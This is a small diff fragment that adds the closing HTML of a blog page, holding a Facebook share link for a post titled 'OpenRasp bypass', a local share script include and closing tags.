+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/notebook_posts/OpenRasp%20bypass.html" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
